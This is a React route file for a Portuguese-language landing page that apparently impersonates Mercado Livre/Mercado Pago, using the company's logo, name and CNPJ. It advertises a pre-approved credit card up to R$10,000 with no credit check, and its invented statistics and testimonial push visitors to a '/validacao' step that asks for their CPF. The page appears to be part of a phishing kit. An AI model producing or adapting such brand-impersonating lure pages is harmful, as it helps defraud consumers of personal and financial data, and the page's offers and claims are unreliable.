import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Cartão de Crédito Pré-aprovado - Limite de até R$10.000" },
      { name: "description", content: "Solicite seu cartão de crédito pré-aprovado com limite de até R$10.000. Sem consulta ao SPC/Serasa, aprovação em 5 minutos." },
      { property: "og:title", content: "Cartão de Crédito Pré-aprovado" },
      { property: "og:description", content: "Limite de até R$10.000. Sem burocracia." },
    ],
    links: [
      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
    ],
  }),
  component: Index,
});

const heroImg = "https://i.postimg.cc/Hk7bBxRq/image-(2).png";
const steps = [
  { img: "https://i.postimg.cc/90tYKgYq/1.jpg", text: "Preencha seu CPF para consultar seu limite de cartão pré-aprovado" },
  { img: "https://i.postimg.cc/g0CyJbMp/2.jpg", text: "Escolha seu modelo de cartão e forma de envio" },
  { img: "https://i.postimg.cc/8kBd13Lf/3.jpg", text: "Receba seu cartão no conforto de casa e comece a usar" },
];

function Index() {
  const [idx, setIdx] = useState(0);
  const navigate = useNavigate();

  useEffect(() => {
    const t = setInterval(() => setIdx((i) => (i + 1) % 3), 5000);
    return () => clearInterval(t);
  }, []);

  const handleCTA = () => {
    navigate({ to: "/validacao" });
  };

  return (
    <div className="min-h-screen bg-[#EEEEEE]">
      <div className="max-w-md mx-auto min-h-screen bg-white relative">
        {/* Header */}
        <div className="flex items-center px-4 py-3 bg-white border-b border-gray-100">
          <button aria-label="Voltar" className="text-[#3483FA] text-xl">
            <i className="fas fa-arrow-left" />
          </button>
          <div className="flex-1 flex justify-center items-center">
            <img src={mlLogo} alt="Mercado Livre" className="h-28 md:h-36 object-contain" />
          </div>
          <div className="w-6" />
        </div>

        {/* Hero */}
        <div className="relative">
          <img src={heroImg} alt="Cartão Mercado Pago Pré-aprovado" className="w-full h-auto object-contain block" />
        </div>

        {/* Vantagens */}
        <div className="px-4 -mt-8 relative z-10">
          <div className="bg-white rounded-xl shadow-md p-6">
            <h2 className="text-xl font-semibold text-gray-800 mb-6 text-center">Vantagens exclusivas</h2>
            <div className="space-y-4">
              <div className="flex items-center bg-blue-50 p-4 rounded-lg">
                <div className="bg-[#3483FA] text-white w-10 h-10 rounded-full flex items-center justify-center mr-4 shrink-0">
                  <i className="fas fa-bolt text-lg" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-800">Crédito na hora</h3>
                  <p className="text-sm text-gray-600">Para usar onde e quando quiser!</p>
                </div>
              </div>
              <div className="flex items-center bg-[#FFF8E1] p-4 rounded-lg">
                <div className="bg-[#FFE600] text-[#333] w-10 h-10 rounded-full flex items-center justify-center mr-4 shrink-0">
                  <i className="fas fa-shield-alt text-lg" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-800">Sem burocracia</h3>
                  <p className="text-sm text-gray-600">Sem consulta ao SPC/Serasa.</p>
                </div>
              </div>
              <div className="flex items-center bg-green-50 p-4 rounded-lg">
                <div className="bg-[#00A650] text-white w-10 h-10 rounded-full flex items-center justify-center mr-4 shrink-0">
                  <i className="fas fa-credit-card text-lg" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-800">Cartão para seu dia a dia</h3>
                  <p className="text-sm text-gray-600">Use em lojas físicas e online.</p>
                </div>
              </div>
            </div>

            <button
              onClick={handleCTA}
              className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md mt-6 transition-all duration-300 animate-pulse"
            >
              Solicitar meu cartão agora
            </button>

            <div className="flex items-center justify-center mt-4 pt-4 border-t border-gray-100 text-gray-600">
              <i className="fas fa-lock mr-2 text-[#00A650]" />
              <span className="text-sm">Seus dados estão protegidos e seguros</span>
            </div>
          </div>
        </div>

        {/* Como Solicitar */}
        <div id="como-solicitar" className="px-4 mt-6">
          <div className="bg-white rounded-xl shadow-md p-6">
            <h2 className="text-xl font-semibold text-gray-800 mb-6 text-center">Como Solicitar?</h2>

            <div className="flex items-center justify-between mb-6">
              {[0, 1, 2].map((n) => (
                <div key={n} className="flex items-center flex-1 last:flex-none">
                  <div
                    className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-semibold ${
                      idx >= n ? "bg-[#3483FA] text-white" : "bg-gray-200 text-gray-500"
                    }`}
                  >
                    {n + 1}
                  </div>
                  {n < 2 && (
                    <div className={`h-1 flex-1 mx-1 ${idx > n ? "bg-[#3483FA]" : "bg-gray-200"}`} />
                  )}
                </div>
              ))}
            </div>

            <div className="relative">
              <div className="text-center">
                <div className="bg-gray-50 rounded-lg p-4 mb-4">
                  <img src={steps[idx].img} alt={`Etapa ${idx + 1}`} className="mx-auto max-h-64 object-contain" />
                </div>
                <p className="text-gray-800 font-medium">
                  <span className="font-bold">{idx + 1}.</span> {steps[idx].text}
                </p>
              </div>

              <button
                onClick={() => setIdx((i) => (i - 1 + 3) % 3)}
                aria-label="Anterior"
                className="absolute left-2 top-24 -translate-y-1/2 bg-white rounded-full w-10 h-10 flex items-center justify-center shadow-lg text-[#3483FA] hover:bg-blue-50"
              >
                <i className="fas fa-chevron-left" />
              </button>
              <button
                onClick={() => setIdx((i) => (i + 1) % 3)}
                aria-label="Próximo"
                className="absolute right-2 top-24 -translate-y-1/2 bg-white rounded-full w-10 h-10 flex items-center justify-center shadow-lg text-[#3483FA] hover:bg-blue-50"
              >
                <i className="fas fa-chevron-right" />
              </button>
            </div>

            <div className="flex justify-center mt-4 space-x-2">
              {[0, 1, 2].map((n) => (
                <button
                  key={n}
                  onClick={() => setIdx(n)}
                  aria-label={`Ir para etapa ${n + 1}`}
                  className={`w-2 h-2 rounded-full ${idx === n ? "bg-[#3483FA]" : "bg-gray-300"}`}
                />
              ))}
            </div>
          </div>
        </div>

        {/* Estatísticas */}
        <div className="px-4 mt-6">
          <div className="bg-white rounded-xl shadow-md p-6 flex justify-between text-center">
            <div>
              <p className="text-2xl font-bold text-[#3483FA]">+500mil</p>
              <p className="text-xs text-gray-600">Clientes</p>
            </div>
            <div>
              <p className="text-2xl font-bold text-[#3483FA]">4.8/5</p>
              <p className="text-xs text-gray-600">Avaliação</p>
            </div>
            <div>
              <p className="text-2xl font-bold text-[#3483FA]">5 min</p>
              <p className="text-xs text-gray-600">Aprovação</p>
            </div>
          </div>
        </div>

        {/* Ver Limite */}
        <div className="px-4 mt-6">
          <button
            onClick={handleCTA}
            className="bg-white rounded-xl shadow-md p-4 w-full flex items-center justify-between"
          >
            <div className="flex items-center">
              <div className="bg-blue-50 w-10 h-10 rounded-full flex items-center justify-center mr-3">
                <i className="fas fa-calculator text-[#3483FA]" />
              </div>
              <div className="text-left">
                <p className="font-semibold text-gray-800">Ver Limite Disponível</p>
                <p className="text-sm text-gray-600">Descubra qual limite está liberado para você</p>
              </div>
            </div>
            <i className="fas fa-chevron-right text-[#3483FA]" />
          </button>
        </div>

        {/* Depoimentos */}
        <div className="px-4 mt-6 mb-8">
          <div className="bg-white rounded-xl shadow-md p-6">
            <div className="flex items-center mb-4">
              <div className="bg-blue-50 rounded-full p-2 mr-3">
                <i className="fas fa-quote-right text-[#3483FA]" />
              </div>
              <p className="font-semibold text-gray-800">O que dizem nossos clientes</p>
            </div>
            <div className="border-l-4 border-[#3483FA] pl-4">
              <p className="text-gray-700 italic mb-2">
                "Processo super rápido, meu cartão chegou rapidinho e já veio com limite liberado! Recomendo!"
              </p>
              <div className="flex items-center">
                <p className="text-sm font-semibold text-gray-800 mr-2">Mariana S.</p>
                <div className="flex text-yellow-400">
                  {Array.from({ length: 5 }).map((_, i) => (
                    <i key={i} className="fas fa-star text-xs" />
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="px-4 pb-6">
          <div className="text-center text-xs text-gray-500">
            <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
            <p>CNPJ: 10.573.521/0001-91</p>
          </div>
        </div>
      </div>
    </div>
  );
}
